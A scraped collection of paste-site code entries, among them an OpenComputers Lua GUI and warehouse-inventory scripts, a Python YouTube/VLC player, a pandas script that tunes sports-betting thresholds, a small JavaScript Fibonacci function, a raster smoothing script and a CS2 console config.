    local xMax = self.xMax + absParentX
    local yMin = self.yMin + absParentY
    local yMax = self.yMin + absParentY
    if x >= xMin and x <= xMax and y >= yMin and y <= yMax then
        return true
    end
    return false
end

function ScrollBar:isScrollDownTouched(x, y, absParentX, absParentY) 
    local xMin = self.xMin + absParentX
    local xMax = self.xMax + absParentX
    local yMin = self.yMax + absParentY
    local yMax = self.yMax + absParentY
    if x >= xMin and x <= xMax and y >= yMin and y <= yMax then
        return true
    end
    return false
end

function ScrollBar:isBarTouched(x, y, absParentX, absParentY) 
    local xMin = self.xMin + absParentX
    local xMax = self.xMax + absParentX
    local yMin = self.yMin + absParentY + 2
    local yMax = self.yMax + absParentY - 2
    if x >= xMin and x <= xMax and y >= yMin and y <= yMax then
        return true
    end
    return false
end

function ScrollBar:render()
    local absParentX, absParentY = self.parent:getAbsXY()
    local x = self.x + absParentX
    local y = self.y + absParentY
    self.gpu.setBackground(self.defaultBackgroundColor)
    self.gpu.fill(x, y, self.width, self.height, "" "")
    self.gpu.setBackground(self.backgroundColor)
    self.gpu.setForeground(self.textColor)
    self.gpu.set(x, y, ""^"")
    self.gpu.set(x, y + self.height - 1, ""v"")
    local barHeight = math.ceil((self.height - 4)/ self.maxPos)
    local barStart = y + 2 + barHeight * (self.currentPos - 1)
    if self.currentPos == self.maxPos then
        local ajustedBarHeight = barStart + barHeight - (self.yMax + absParentY - 1)
        self.gpu.fill(x, barStart, self.width, barHeight - ajustedBarHeight, ""▒"")
    else
        self.gpu.fill(x, barStart, self.width, barHeight, ""▒"")
    end
end

local TextArea = {}
setmetatable(TextArea, {__index = Component})

function TextArea:new(name, x, y, width, height, textColor, backgroundColor)
    local obj = Component.new(self, name, x, y, width, height)
    obj.lines = {}
    obj.textColor = textColor
    obj.backgroundColor = backgroundColor
    return obj
end


function TextArea:setText(lines)
    self.lines = lines
    self.rerender = true
end

function TextArea:setTextColor(textColor)
    if textColor and textColor ~= self.textColor then
        self.textColor = textColor
        self.rerender = true
    end
end

function TextArea:setBackgroundColor(backgroundColor)
    if backgroundColor and backgroundColor ~= self.backgroundColor then
        self.backgroundColor = backgroundColor
        self.rerender = true
    end
end

function TextArea:wrapText(text)
    local lines = {}
    local currentLine = """"
    for word in text:gmatch(""%S+"") do
        if #currentLine + #word <= self.width then
            currentLine = currentLine .. word .. "" ""
        else
            table.insert(lines, currentLine)
            currentLine = word .. "" ""
        end
    end
    table.insert(lines, currentLine)
    return lines
end

function TextArea:render()
    if self.rerender then
        local absParentX, absParentY = self.parent:getAbsXY()
        local x = self.x + absParentX
        local y = self.y + absParentY
        self.gpu.setBackground(self.defaultBackgroundColor)
        self.gpu.fill(x, y, self.width, self.height, "" "")
        self.gpu.setBackground(self.backgroundColor)
        self.gpu.setForeground(self.textColor)
        for i, line in pairs(self.lines) do
            self.gpu.set(x, y + i - 1, line)
        end
        self.rerender = false
    end
end


local List = {}
setmetatable(List, {__index = Component})

function List:new(name, x, y, width, height, maxItemsSize, textColor, backgroundColor)
    local obj = Component.new(self, name, x, y, width, height)
    obj.textList = {}
    obj.maxItemsSize = maxItemsSize
    obj.textColor = textColor
    obj.backgroundColor = backgroundColor
    obj.padding = 2
    obj.align = ALIGN.left

    for i = 1, maxItemsSize do
        local label = Label:new(name .. ""_label_"" .. i, 0, 0 + (i - 1) * 2, width, obj.padding, """", textColor, backgroundColor)
        label.idx = i 
        label:hide()
        obj:addComponent(label, i)
    end

    return obj
end


function List:setTextList(textList)
    self.textList = textList
    for _, prioritizedComponent in pairs(self.componentsPrioritized) do
        local label = prioritizedComponent.component
        if textList[label.idx] then
            label:setText(textList[label.idx])
            label:show()
        else
            label:hide()
            label.setText("""")
        end
    end
end

function List:setTextColor(textColor)
    if textColor and textColor ~= self.textColor then
        for _, component in pairs(self.components) do
            component:setTextColor(textColor)
        end
        self.rerender = true
    end
end

function List:setBackgroundColor(backgroundColor)
    if backgroundColor and backgroundColor ~= self.backgroundColor then
        for _, component in pairs(self.components) do
            component:setBackgroundColor(backgroundColor)
        end
        self.rerender = true
    end
end

function List:setAlign(align)
    if align and align ~= self.align then
        for _, component in pairs(self.components) do
            component:setAlign(align)
        end
        self.rerender = true
    end
end

function List:setPadding(padding)
    if padding and padding ~= self.padding then
        for _, component in pairs(self.components) do
            component:setPadding(padding)
        end
        self.rerender = true
    end
end

function List:setOnTouch(callback)
    for _, component in pairs(self.components) do
        component:setOnTouch(callback)
    end
end

function List:addComponent(component, renderPriority)
    if  getmetatable(component) ~= Label then
        return
    end
    component:setParent(self)
    self.components[component.name] = component
    table.insert(self.componentsPrioritized, {renderPriority = renderPriority, component = component})
end

function List:render()
    for _, component in pairs(self.components) do
        component:render()
    end
end

return {
    Screen = Screen,
    Section = Section,
    Label = Label,
    Button = Button,
    ScrollBar = ScrollBar,
    TextArea = TextArea,
    List = List,
    COLORS = COLORS,
    debug = debug
}"
N2Qms9H2,inventoryController,Zeehao,Lua,Sunday 17th of March 2024 08:21:03 PM CDT,"local inventoryController = {}

function inventoryController.generateKey(slot)
    return slot.name .. slot.label .. tostring(slot.maxSize) .. tostring(slot.maxDamage) .. tostring(slot.damage)
end


function inventoryController:transferItem(transposer, fromSide, toSide, fromSlot, amount)
    local fromStack = transposer.getStackInSlot(fromSide, fromSlot)
    if fromStack == nil then
        return 0
    end
    local leftAmount = amount
    local toSize = transposer.getInventorySize(toSide)
    for i = 1, toSize do
        leftAmount = leftAmount - transposer.transferItem(fromSide, toSide, leftAmount, fromSlot, i)
        if leftAmount == 0 then
            return amount
        end
    end
    return amount - leftAmount
end

return inventoryController"
dVraaAP8,warehouseManager,Zeehao,Lua,Sunday 17th of March 2024 08:20:10 PM CDT,"local ic = require(""inventoryController"")
local component = require(""component"")
local sides = require(""sides"")
local logger = require(""logger"")

local log = logger.getLogger(""WareHouseManager"")

local manager = {}
manager.transposers = {}
manager.data = {}
manager.scanSides = {}
table.insert(manager.scanSides, sides.top)
table.insert(manager.scanSides, sides.front)
table.insert(manager.scanSides, sides.back)
table.insert(manager.scanSides, sides.left)
table.insert(manager.scanSides, sides.right)

for address, _ in component.list(""transposer"") do
    manager.transposers[address] = component.proxy(address)
end

local function dataInsertSlotInfo(transposer, side, idx, slotInfo, data) 
    if slotInfo and slotInfo.name then
        local key = ic.generateKey(slotInfo)
        if data[key] then
            data[key].amount = data[key].amount + slotInfo.size
            if data[key].locations[transposer.address] then
                if data[key].locations[transposer.address][side] then
                    data[key].locations[transposer.address][side][idx] = slotInfo.size
                else
                    data[key].locations[transposer.address][side] = {}
                    data[key].locations[transposer.address][side][idx] = slotInfo.size
                end
            else
                data[key].locations[transposer.address] = {}
                data[key].locations[transposer.address][side] = {}
                data[key].locations[transposer.address][side][idx] = slotInfo.size
            end
        else
            data[key] = {
                name = slotInfo.name,
                label = slotInfo.label,
                maxSize = slotInfo.maxSize,
                maxDamage = slotInfo.maxDamage,
                damage = slotInfo.damage,
                amount = slotInfo.size,
                locations = {}
            }
            data[key].locations[transposer.address] = {}
            data[key].locations[transposer.address][side] = {}
            data[key].locations[transposer.address][side][idx] = slotInfo.size
        end
    end
end

local function scanAndCacheInventoryInfo (transposer, scanSide, data)
    if data == nil then
        data = {}
    end
    local next, _ = transposer.getAllStacks(scanSide)
    if next == nil then
        return data
    end
    log:print(""Scanning: "", transposer.address, "" on side: "", scanSide)
    local slotInfo = nil
    local slotIdx = 0
    repeat
        slotInfo = next()
        slotIdx = slotIdx + 1
        dataInsertSlotInfo(transposer, scanSide, slotIdx, slotInfo, data)
    until slotInfo == nil
    return data
end


function manager:scanAndCacheAllInventoryInfo ()
    local data = {}
    for _, transposer in pairs(self.transposers) do
        for _, scanSide in pairs(self.scanSides) do
            scanAndCacheInventoryInfo(transposer, scanSide, data)
        end
    end
    self.data = data
end

function manager:getItemInfo(item)
    local key = ic.generateKey(item)
    return self.data[key]
end

function manager:exportItems(item, amount, targetSide) 
    local itemInfo = self:getItemInfo(item)
    if not itemInfo or amount >= itemInfo.amount then
        return false
    end
    while amount > 0 do
        local transfered = 0
        for tAddress, fSides in pairs(itemInfo.locations) do
            for fSide, fSlots in pairs(fSides) do
                for slot, size in pairs(fSlots) do
                    local currTransferAmount = math.min(amount, size)
                    transfered = ic.transferItem(self.transposers[tAddress], fSide, targetSide, slot, currTransferAmount)
                    fSlots[slot] = fSlots[slot] - transfered
                    if (fSlots[slot] == 0) then
                        table.remove(fSlots, slot)
                    end
                    itemInfo.amount = itemInfo.amount - transfered
                    amount = amount - transfered
                end
            end
        end
    end
end

return manager"
WW80Rap9,YOUTUBE-SEARCH2.py,Najeebsk,Python,Sunday 17th of March 2024 08:15:49 PM CDT,"import tkinter as tk
import vlc
from youtube_search import YoutubeSearch
from pytube import YouTube
from pytube.exceptions import AgeRestrictedError
import webbrowser

class VideoPlayer:
    def __init__(self, root):
        self.root = root
        self.instance = vlc.Instance('--no-xlib')  # Create a VLC instance
        self.player = self.instance.media_player_new()  # Create a media player
        self.video_urls = {}  # Initialize video URL dictionary

        # Color Palette
        self.bg_color = ""#336699""
        self.button_color = ""#4CAF50""
        self.text_color = ""white""

        self.main_frame = tk.Frame(root, bg=self.bg_color)
        self.main_frame.pack(fill=""both"", expand=True)

        self.title_label = tk.Label(self.main_frame, text=""NAJEEB VIDEO PLAYER"", font=(""Arial"", 24, ""bold""), fg=self.text_color, bg=self.bg_color)
        self.title_label.pack(pady=10)

        self.search_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.search_frame.pack(fill=""x"")

        self.search_entry = tk.Entry(self.search_frame)
        self.search_entry.pack(side=""left"", fill=""x"", expand=True, padx=5, pady=5)

        self.search_button = tk.Button(self.search_frame, text=""Search YouTube"", command=self.search_and_play, bg=self.button_color, fg=self.text_color)
        self.search_button.pack(side=""left"", padx=5, pady=5)

        self.save_button = tk.Button(self.search_frame, text=""Save"", command=self.save_results, bg=self.button_color, fg=self.text_color)
        self.save_button.pack(side=""left"", padx=5, pady=5)

        self.list_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.list_frame.pack(side=""left"", fill=""both"", expand=False)

        self.button_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.button_frame.pack(side=""bottom"", fill=""x"")

        self.lst = tk.Listbox(self.list_frame, width=30, height=20, bg=self.bg_color, fg=self.text_color)
        self.lst.pack(side=""left"", fill=""both"", expand=True)

        self.scrollbar = tk.Scrollbar(self.list_frame, orient=""vertical"", command=self.lst.yview)
        self.scrollbar.pack(side=""right"", fill=""y"")
        self.lst.config(yscrollcommand=self.scrollbar.set)

        self.page = 1
        self.per_page = 10

        self.prev_button = tk.Button(self.button_frame, text=""Prev"", command=self.prev_page, bg=self.button_color, fg=self.text_color)
        self.prev_button.pack(side=""left"", padx=5, pady=5)

        self.next_button = tk.Button(self.button_frame, text=""Next"", command=self.next_page, bg=self.button_color, fg=self.text_color)
        self.next_button.pack(side=""left"", padx=5, pady=5)

        self.play_button = tk.Button(self.button_frame, text=""Play"", command=self.play_video, bg=self.button_color, fg=self.text_color)
        self.play_button.pack(side=""left"", padx=5, pady=5)

        self.stop_button = tk.Button(self.button_frame, text=""Stop"", command=self.stop_video, bg=self.button_color, fg=self.text_color)
        self.stop_button.pack(side=""left"", padx=5, pady=5)

        self.current_video_label = tk.Label(root, text=""No video selected"", bg=self.bg_color, fg=self.text_color)
        self.current_video_label.pack(pady=5)

        self.player_frame = tk.Frame(self.main_frame)
        self.player_frame.pack(side=""right"", fill=""both"", expand=True)

        self.lst.bind(""<<ListboxSelect>>"", self.show_video)

        # Load saved video list when the application starts
        self.load_saved_results()

    def search_and_play(self):
        query = self.search_entry.get()
        search_results = YoutubeSearch(query, max_results=self.per_page*self.page).to_dict()
        if search_results:
            self.lst.delete(0, tk.END)
            for result in search_results:
                video_title = result['title']
                video_url = 'https://www.youtube.com' + result['url_suffix']
                self.lst.insert(tk.END, video_title)
                self.video_urls[video_title] = video_url  # Store title and URL in dictionary
            self.save_results()  # Save updated list of videos

    def play_video(self):
        if self.lst.curselection():
            title = self.lst.get(self.lst.curselection())
            video_url = self.video_urls.get(title)  # Get URL from dictionary
            print(""Playing video:"", video_url)  # Print URL for debugging

            try:
                # Use pytube to get the video URL
                yt = YouTube(video_url)
                video_url = yt.streams.filter(progressive=True, file_extension='mp4').first().url

                media = self.instance.media_new(video_url)
                self.player.set_media(media)
                self.player.set_hwnd(self.player_frame.winfo_id())
                self.player.play()
                self.current_video_label.config(text=f""Playing: {title}"")
            except AgeRestrictedError:
                print(""Age restricted video:"", video_url)
                webbrowser.open(video_url)  # Open age-restricted videos in the default web browser
            except Exception as e:
                print(""Error:"", e)
                self.current_video_label.config(text=""An error occurred while playing the video."")
        else:
            print(""No video selected."")

    def stop_video(self):
        self.player.stop()
        self.current_video_label.config(text=""Video stopped"")

    def save_results(self):
        with open(""YouTube_list.txt"", ""a"") as file:  # Append mode to append new results
            for title, url in self.video_urls.items():
                file.write(f""{title}: {url}\n"")

    def load_saved_results(self):
        try:
            with open(""YouTube_list.txt"", ""r"") as file:
                for line in file:
                    if ':' in line:
                        title, url = line.strip().split(': ', 1)
                        self.video_urls[title] = url
                        self.lst.insert(tk.END, title)
        except FileNotFoundError:
            print(""No saved results found."")

    def show_video(self, event):
        # Add implementation to show the selected video
        pass

    def prev_page(self):
        if self.page > 1:
            self.page -= 1
            self.search_and_play()

    def next_page(self):
        self.page += 1
        self.search_and_play()

root = tk.Tk()
root.geometry(""800x600+300+50"")
root.title(""Najeeb VLC Player"")
root.configure(bg=""#336699"")
video_player = VideoPlayer(root)
root.mainloop()
"
8Sa8815X,Untitled,PyNoob11,Python,Sunday 17th of March 2024 08:05:13 PM CDT,"# %%
import cudf.pandas
cudf.pandas.install()
import pandas as pd
import numpy as np
import math
import time
from threading import Thread

pd.set_option('display.max_rows', 30000)
pd.set_option('display.max_columns', 500)
pd.set_option('display.width', 1000)
pd.set_option('display.max_colwidth', None)

def threaded(fn):
    def wrapper(*args, **kwargs):
        thread = Thread(target=fn, args=args, kwargs=kwargs)
        thread.start()
        return thread
    return wrapper

# %% Provided in the gofile data: https://gofile.io/d/bu3N1p
df = pd.read_csv()

# %%
# Specify the columns to keep
columns_to_keep = [""home_score"", ""away_score"", ""total_score"", ""score_difference"", ""predicted_total_score"", ""predicted_score_difference"", ""result"", ""predicted_result"", ""result_match"", ""Win"", ""DNB"", ""O_1_5"", ""O_2_5"", ""U_4_5""]

# Select only the specified columns from the dataframe
df = df[columns_to_keep]

# %%
def selection(row):
    if row[""predicted_score_difference""] > row[""Win""] and row[""predicted_total_score""] > row[""O_2_5""]:
        if row[""Win""] == 1.1 and row[""O_2_5""] == 3:
            return ""W & O 2.5 (both untested)""
        elif row[""Win""] == 1.1 and row[""O_2_5""] > 3:
            return ""Win (untested) & O 2.5""
        elif row[""Win""] > 1.1 and row[""O_2_5""] == 3:
            return ""Win & O 2.5 (untested)""
        else:
            return ""W & O 2.5""
    if row[""predicted_score_difference""] > row[""Win""] and row[""predicted_total_score""] > row[""O_1_5""]:
        if row[""Win""] == 1.1 and row[""O_1_5""] == 2:
            return ""W & O 1.5 (both untested)""
        elif row[""Win""] == 1.1 and row[""O_1_5""] > 2:
            return ""Win (untested) & O 1.5""
        elif row[""Win""] > 1.1 and row[""O_1_5""] == 2:
            return ""Win & O 1.5 (untested)""
        else:
            return ""W & O 1.5""
    if row[""predicted_score_difference""] > row[""Win""] and row[""predicted_total_score""] < row[""U_4_5""]:
        if row[""Win""] == 1.1 or row[""U_4_5""] == 4:
            return ""W & U 4.5 (both untested)""
        elif row[""Win""] == 1.1 or row[""U_4_5""] < 4:
            return ""Win (untested) & U 4.5""
        elif row[""Win""] > 1.1 or row[""U_4_5""] == 4:
            return ""Win & U 4.5 (untested)""
        else:
            return ""W & U 4.5""
    if row[""Win""] == 1.1 and row[""predicted_score_difference""] > row[""Win""]:
            return ""W (untested)""
    elif row[""predicted_score_difference""] > row[""Win""]:
        return ""W""
    if row[""predicted_score_difference""] > row[""DNB""] and row[""predicted_score_difference""] < row[""Win""] and row[""predicted_total_score""] > row[""O_2_5""]:
        if row[""DNB""] == 0.7 and row[""O_2_5""] == 3:
            return ""DNB or O 2.5 (both untested)""
        elif row[""DNB""] == 0.7 and row[""O_2_5""] > 3:
            return ""DNB (untested) or O 2.5""
        elif row[""DNB""] > 0.7 and row[""O_2_5""] == 3:
            return ""DNB or O 2.5 (untested)""
        else:
            return ""DNB or O 2.5""
    if row[""predicted_score_difference""] > row[""DNB""] and row[""predicted_score_difference""] < row[""Win""] and row[""predicted_total_score""] > row[""O_1_5""]:
        if row[""DNB""] == 0.7 and row[""O_1_5""] == 2:
            return ""DNB or O 1.5 (both untested)""
        if row[""DNB""] == 0.7 and row[""O_1_5""] > 2:
            return ""DNB (untested) or O 1.5""
        elif row[""DNB""] > 0.7 and row[""O_1_5""] == 2:
            return ""DNB or O 1.5 (untested)""
        else:
            return ""DNB or O 1.5""
    if row[""predicted_score_difference""] > row[""DNB""] and row[""predicted_score_difference""] < row[""Win""]:
        if row[""DNB""] == 0.7:
            return ""DNB (untested)""
        else:
            return ""DNB""
    if row[""O_2_5""] == 3 and row[""predicted_total_score""] > row[""O_2_5""]:
        return ""O 2.5 (untested)""
    elif row[""predicted_total_score""] > row[""O_2_5""]:
        return ""O 2.5""
    if row[""O_1_5""] == 2 and row[""predicted_total_score""] > row[""O_1_5""]:
        return ""O 1.5 (untested)""
    elif row[""predicted_total_score""] > row[""O_1_5""]:
        return ""O 1.5""
    if row[""predicted_total_score""] < row[""U_4_5""]:
        if row[""U_4_5""] == 4:
            return ""U 4.5 (untested)""
        else:
            return ""U 4.5""
    else:
        return ""N""

# %%
# Apply the function to each row in your DataFrame
print(""Apply default Selection criteria"")
df['selection'] = df.apply(selection, axis=1)

# %%
def selection_match(row):
    if pd.isna(row[""home_score""]) or pd.isna(row[""away_score""]):
        return ""no_result""
    if row[""selection""] == ""N"":
        return ""no selection""
    elif row[""result""] == row[""predicted_result""] and row[""total_score""] > 2.5 and (row[""selection""] == ""W & O 2.5 (both untested)"" or row[""selection""] == ""Win (untested) & O 2.5""  or row[""selection""] == ""Win & O 2.5 (untested)"" or row[""selection""] == ""W & O 2.5""):
        return ""match""
    elif row[""result""] == row[""predicted_result""] and row[""total_score""] > 1.5 and (row[""selection""] == ""W & O 1.5 (both untested)"" or row[""selection""] == ""Win (untested) & O 1.5""  or row[""selection""] == ""Win & O 1.5 (untested)"" or row[""selection""] == ""W & O 1.5""):
        return ""match""
    elif row[""result""] == row[""predicted_result""] and row[""total_score""] < 4.5 and (row[""selection""] == ""W & U 4.5 (both untested)"" or row[""selection""] == ""Win (untested) & U 4.5""  or row[""selection""] == ""Win & U 4.5 (untested)"" or row[""selection""] == ""W & U 4.5""):
        return ""match""
    elif row[""result""] == row[""predicted_result""] and (row[""selection""] == ""W"" or row[""selection""] == ""W (untested)""):
        return ""match""
    elif (row[""result""] == row[""predicted_result""] or row[""result""] == 'draw' or row[""total_score""] > 2.5) and (row[""selection""] == ""DNB or O 2.5 (both untested)"" or row[""selection""] == ""DNB (untested) or O 2.5""  or row[""selection""] == ""DNB or O 2.5 (untested)"" or row[""selection""] == ""DNB or O 2.5""):
        return ""match""
    elif (row[""result""] == row[""predicted_result""] or row[""result""] == 'draw' or row[""total_score""] > 1.5) and (row[""selection""] == ""DNB or O 1.5 (both untested)"" or row[""selection""] == ""DNB (untested) or O 1.5""  or row[""selection""] == ""DNB or O 1.5 (untested)"" or row[""selection""] == ""DNB or O 1.5""):
        return ""match""
    elif (row[""result""] == row[""predicted_result""] or row[""result""] == 'draw') and (row[""selection""] == ""DNB"" or row[""selection""] == ""DNB (untested)""):
        return ""match""
    elif row[""total_score""] > 2.5 and (row[""selection""] == ""O 2.5"" or row[""selection""] == ""O 2.5 (untested)""):
        return ""match""
    elif row[""total_score""] > 1.5 and (row[""selection""] == ""O 1.5"" or row[""selection""] == ""O 1.5 (untested)""):
        return ""match""
    elif (row[""total_score""]) < 5 and (row[""selection""] == ""U 4.5"" or row[""selection""] == ""U 4.5 (untested)""):
        return ""match""
    else:
        return ""no match""

# %%
# Check the selections to the weights and get selection_match column to each row in your DataFrame
print(""Check selected weights"")
df['selection_match'] = df.apply(selection_match, axis=1)
selection_match_count = df['selection_match'].value_counts()
print(selection_match_count)

# %%
# Filter applied
selection_match_count = df['selection_match'].value_counts()
df = df[df['selection_match'] == ""no match""]

# %%
no_match_count = df[df['selection_match'] == ""no match""].groupby('selection').size()
print(f""Count of 'no match' rows grouped by selection column: \n{no_match_count}"")

# %%
def selection_update_weights(df):
    # Define the selections for 'Win'
    selections_win = [""W & O 2.5 (both untested)"", ""Win (untested) & O 2.5"", ""Win & O 2.5 (untested)"", ""W & O 2.5"", 
                        ""W & O 1.5 (both untested)"", ""Win (untested) & O 1.5"", ""Win & O 1.5 (untested)"", ""W & O 1.5"", 
                        ""W & U 4.5 (both untested)"", ""Win (untested) & U 4.5"", ""Win & U 4.5 (untested)"", ""W & U 4.5"", 
                        ""W (untested)"", ""W""]

    # Create a boolean mask for the condition for 'Win'
    mask_win = (df['selection_match'] == ""no match"") & \
                (df['selection'].isin(selections_win)) & \
                (df['result_match'] == ""no match"")

    # Apply the condition and update the 'Win' column
    df.loc[mask_win, 'Win'] = df.loc[mask_win, 'predicted_score_difference'] + 0.02

    # Define the selections for 'DNB'
    selections_DNB = [""DNB or O 2.5 (both untested)"", ""DNB (untested) or O 2.5"", ""DNB or O 2.5 (untested)"",
                        ""DNB or O 2.5"", ""DNB or O 1.5 (both untested)"", ""DNB (untested) or O 1.5"", 
                        ""DNB or O 1.5 (untested)"", ""DNB or O 1.5"", ""DNB (untested)"", ""DNB""]

    # Create a boolean mask for the condition for 'DNB'
    mask_DNB = ((df['selection_match'] == 'no match') & \
                (df['selection'].isin(selections_DNB)) & \
                (df['result_match'] == 'no match') & \
                (df['result'] != 'draw'))

    # Apply the condition and update the 'DNB' column
    df.loc[mask_DNB, 'DNB'] = df.loc[mask_DNB, 'predicted_score_difference'] + 0.02

    # Define the selections for O 1.5'
    selections_O_1_5 = [""W & O 1.5 (both untested)"", ""Win (untested) & O 1.5"", ""Win & O 1.5 (untested)"",
                        ""W & O 1.5"", ""DNB or O 1.5 (both untested)"", ""DNB (untested) or O 1.5"", 
                        ""DNB or O 1.5 (untested)"", ""DNB or O 1.5"", ""O 1.5 (untested)"", ""O 1.5""]

    # Create a boolean mask for the condition for 'O 1.5'
    mask_O_1_5 = ((df['selection_match'] == 'no match') & \
                (df['selection'].isin(selections_O_1_5)) & \
                (df['total_score'] < 2))

    # Apply the condition and update the 'O 1.5' column
    df.loc[mask_O_1_5, 'O_1_5'] = df.loc[mask_O_1_5, 'predicted_total_score'] + 0.02

    # Define the selections for O 2.5'
    selections_O_2_5 = [""W & O 2.5 (both untested)"", ""Win (untested) & O 2.5"", ""Win & O 2.5 (untested)"", 
                        ""W & O 2.5"", ""DNB or O 2.5 (both untested)"", ""DNB (untested) or O 2.5"",
                        ""DNB or O 2.5 (untested)"", ""DNB or O 2.5"", ""O 2.5 (untested)"", ""O 2.5""]

    # Create a boolean mask for the condition for 'O 2.5'
    mask_O_2_5 = ((df['selection_match'] == 'no match') & \
                (df['selection'].isin(selections_O_2_5)) & \
                (df['total_score'] < 3))

    # Apply the condition and update the 'O 2.5' column
    df.loc[mask_O_2_5, 'O_2_5'] = df.loc[mask_O_2_5, 'predicted_total_score'] + 0.02

    # Define the selections for U 4.5'
    selections_U_4_5 = [""W & U 4.5 (both untested)"", ""Win (untested) & U 4.5"", ""Win & U 4.5 (untested)"",
                        ""W & U 4.5"", ""U 4.5 (untested)"", ""U 4.5""]

    # Create a boolean mask for the condition for 'O 2.5'
    mask_U_4_5 = ((df['selection_match'] == 'no match') & \
                (df['selection'].isin(selections_U_4_5)) & \
                (df['total_score'] > 4))

    # Apply the condition and update the 'O 2.5' column
    df.loc[mask_U_4_5, 'U_4_5'] = df.loc[mask_U_4_5, 'predicted_total_score'] - 0.02

    return df

# %%
# Use the function to update selection weights for no match. This needs a vectorised operation hence no .apply
print(""Update selection weights for no match"")
df = selection_update_weights(df)
print(f""Count of 'no match' rows grouped by selection column: \n{no_match_count}"")
match_count = df[df['selection_match'] == ""match""].groupby('selection').size()
print(f""Count of 'match' rows grouped by selection column: \n{match_count}"")
print(df.dtypes)

# %%
# Change selections based on updated weights
print(""Updating Selections basedon updated weights"")
df['selection'] = df.apply(selection, axis=1)
print(f""Count of 'no match' rows grouped by selection column: \n{no_match_count}"")

# %%
print(""Check updated selection criteria"")
df['selection_match'] = df.apply(selection_match, axis=1)
no_match_count = df[df['selection_match'] == ""no match""].groupby('selection').size()
print(f""Count of 'no match' rows grouped by selection column: \n{no_match_count}"")
# Count the number of ""match"" rows grouped by selection column
match_count = df[df['selection_match'] == ""match""].groupby('selection').size()
print(f""Count of 'match' rows grouped by selection column: \n{match_count}"")

# %%
# Filter applied
selection_match_count = df['selection_match'].value_counts()
print(f""Count of rows grouped by selection match column: \n{selection_match_count}"")
df = df[df['selection_match'] == ""no match""]

# %%
# Use the function to update selection weights for no match. This needs a vectorised operation hence no .apply
print(""Update selection weights for no match"")
df = selection_update_weights(df)
print(f""Count of 'no match' rows grouped by selection column: \n{no_match_count}"")
match_count = df[df['selection_match'] == ""match""].groupby('selection').size()
print(f""Count of 'match' rows grouped by selection column: \n{match_count}"")
df.head()


"
ughW85tc,Compact JS Fibbonacci Function,FAT_Scripts,JavaScript,Sunday 17th of March 2024 07:58:06 PM CDT,"async function _GetValue(i) {
    let z = 1 + i;
    const f = async n => {
        let x = 0, y = 1;
        while (n-- > 0) [x, y] = [y, x + y];
        return x;
    };  return await f(z);
}
(async () => { console.log(await _GetValue(3)); })();"
qjzNnckg,Image_Lowess.py,Abhisek92,Python,Sunday 17th of March 2024 07:46:41 PM CDT,"import numpy as np
import rasterio as rio
from functools import partial
from statsmodels.nonparametric.smoothers_lowess import lowess


partial_lowess = partial(
    lowess,
    frac=2/3,
    it=3,
    delta=0.0,
    xvals=None,
    is_sorted=False,
    missing='drop',
    return_sorted=True
)

apply_lowess = np.vectorize(partial_lowess, signature=""(m),(m)->(m, 2)"")

with rio.open(""ascat_raw_mask.tif"") as ascat_src, rio.open(""fac_ais_mask.tif"") as fac_src:
    assert ascat_src.crs == fac_src.crs, ""CRS mismatch!""
    ascat_data = ascat_src.read(masked=True)
    fac_data = fac_src.read(masked=True)
    ascat_backward = np.array(~ascat_src.transform).reshape((3, 3))
    fac_forward = np.array(fac_src.transform).reshape((3, 3))

    ascat_mask = np.any(ascat_data.mask, axis=0)
    fac_mask = np.any(fac_data.mask, axis=0)

    fac_row, fac_col = np.where(~fac_mask)
    fac_indexes = np.stack(
        [(fac_col + 0.5), (fac_row + 0.5), np.ones_like(fac_col)],
        axis=-1
    )
    ascat_indexes = np.round(
        (
            np.einsum(
                ""ij,kj -> ki"", ascat_backward, np.einsum(
                    ""ij,kj -> ki"", fac_forward, fac_indexes
                )
            )[:, :-1] - 0.5
        ),
        decimals=0
    ).astype(int)
    ascat_col, ascat_row = np.array_split(
        ary=ascat_indexes,
        indices_or_sections=ascat_indexes.shape[-1],
        axis=-1
    )
    
    ascat_col = np.squeeze(a=ascat_col, axis=-1)
    ascat_row = np.squeeze(a=ascat_row, axis=-1)

    indices = ~ascat_mask[ascat_row, ascat_col]
    ascat_col = ascat_col[indices]
    ascat_row = ascat_row[indices]
    fac_row = fac_row[indices]
    fac_col = fac_col[indices]

    ascat_values = ascat_data[:, ascat_row, ascat_col].filled()
    fac_values = fac_data[:, fac_row, fac_col].filled()
    smooth = apply_lowess(ascat_values.T, fac_values.T)"
xnhEaar7,Simpvert CS2 config 2024,zPow,C,Sunday 17th of March 2024 07:36:25 PM CDT,"log_color Console F2C6DEFF // Make console PINK!

// Disable all echo except for CONSOLE channel
// For dummies: It makes your console not spew trash 24/7:
log_flags General Assert Developer DeveloperConsole DeveloperVerbose +donotecho
log_flags Symbols ToolsStallMonitor StackUnwinding EntityLoadUnserialize EntitySystem +donotecho
log_flags VScript VScriptDbg Demo InstantReplay RCon +donotecho
log_flags Steam ClockDrift Shooting Server SpawnGroup +donotecho
log_flags SignonState Movie ServerLog stringtables HLTVBroadcast +donotecho
log_flags HLTVServer VR InputService NetworkClientService NetworkP2PService +donotecho
log_flags NetworkServerService NetworkService RenderService ScreenShot SplitScreen +donotecho
log_flags VProf BitBufError Client CommandLine EngineServiceManager GameEventSystem +donotecho
log_flags HostStateManager CommandQueue Filesystem InputSystem IME +donotecho
log_flags LocalizationSystem D3D RenderSystem ResourceSystem SchemaSystem +donotecho
log_flags TypeManager Vfx MaterialSystem PostProcessing modellib +donotecho
log_flags Physics MeshSystem WorldRenderer Pulse SourceTS +donotecho
log_flags Networking NetworkingReliable NetSteamConn SteamNetSockets AnimationGraph +donotecho
log_flags BoneSetup AnimationSystem:IK AnimationSystem AnimResource Interpolation +donotecho
log_flags DualHull SoundSystemLowLevel SoundOperatorSystem SoundSystem +donotecho
log_flags SndOperators SteamAudio LIGHTBINNER SceneSystem CharacterDecalSystem +donotecho
log_flags ToneMapping VolumetricFog ParticlesLib Particles +donotecho
log_flags PanoramaVideoPlayer V8System PanoramaContent VNotify +donotecho
log_flags Panorama PanoramaScript Workshop BodyGameSystem SoundOpGameSystem +donotecho
log_flags VScriptScripts SaveRestore SaveRestoreSyncIO Elapsed +donotecho
log_flags SaveRestoreIO SaveRestoreIOFiltered ClientMessages GlobalState +donotecho
log_flags WebApi HltvDirector CommandQueueEvents CommandQueueSAMPLES +donotecho
log_flags ScenePrint EmitSound SndEmitterSystem Wearable +donotecho
